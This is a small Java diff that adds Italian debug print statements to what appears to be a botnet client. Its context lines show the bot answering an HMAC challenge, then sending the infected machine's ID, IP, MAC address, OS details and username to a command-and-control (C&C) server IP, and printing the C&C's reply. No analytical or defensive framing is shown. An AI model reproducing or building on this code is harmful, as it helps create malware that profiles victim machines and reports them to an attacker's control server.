@@ -121,8 +121,9 @@ public class Behavior {
 			if (challenge != null) {
 				if (challenge.getValue2() != -1) {
 					String key = auth.generateStringKey(challenge.getValue2());
+					System.out.println("Sto calcolando Hmac");
 					String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
-					System.out.println(hashMac);
+					System.out.println("Hmac calcolato: "+hashMac);
 					String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(), nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(), nServ.isElegible());
 					System.out.println("La risposta del C&C: " + response);
 					flag = false;
